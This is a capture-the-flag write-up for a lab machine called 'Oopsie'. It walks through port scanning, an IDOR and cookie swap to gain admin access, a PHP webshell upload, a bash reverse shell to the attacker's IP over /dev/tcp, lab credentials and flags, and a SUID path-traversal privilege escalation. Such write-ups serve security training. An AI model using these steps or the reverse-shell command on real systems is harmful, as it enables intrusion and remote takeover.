
## CTF Writeup: Oopsie

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.46.232
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 19:39 -0500
Nmap scan report for 10.129.46.232
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
```

Enumerated endpoints using feroxbuster and identified multiple interesting endpoints.

/cdn-cgi/login
/uploads

```
feroxbuster --url http://10.129.46.232
```

Upon inspecting the login endpoint, there was an option which allowed us to login as "guest" to the CMS.

Inspecting the Account Tab was promising as it's displayed our guest "Access ID" & the following URL.

```
http://10.129.46.232/cdn-cgi/login/admin.php?content=accounts&id=2
```

Modified the parameter at the top to 1, in order to identify an parameter semantic error within the web application. I was able to get the Access ID of the admin user.

```
34322
```

Navigating to Clients I was able to do the same aswell & gained two potential usernames.

```
john
Tafcz
```

Inspected our storage in order to change the cookie of our current user to 34322 which should be the session cookie of the admin user. After changing it we were able to inspect the Uploads Tab.

Uploaded an wolfswebshell.php and inspected it in the browser to get Command Execution!

```
http://10.129.46.232/uploads/wolfswebshell.php
```

Started up listener on port 800 on my local machine.

```
nc -lvnp 800
```

Executed the following command within the webshell.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/800 0>&1'
```

Gained RCE as user www-data.

```
nc -lvnp 800                                    
listening on [any] 800 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.46.232] 51106
bash: cannot set terminal process group (1366): Inappropriate ioctl for device
bash: no job control in this shell
www-data@oopsie:/var/www/html/uploads$
```

Retrieved user.txt in /home/robert directory.

```
f2c74ee8db7983851ab2a96a44eb7981
```

Found credentials for user "robert" in /var/www/html/cdn-cgi/login/db.php

```
robert:M3g4C0rpUs3r!
```

Connected to the target server via SSH.

```
ssh robert@10.129.46.232
```

Utilized the bugtracker SUID binary in order to view the root.txt.

```
bugtracker
../root.txt
af13b0bee69f8a877c3faf667f7beacf
```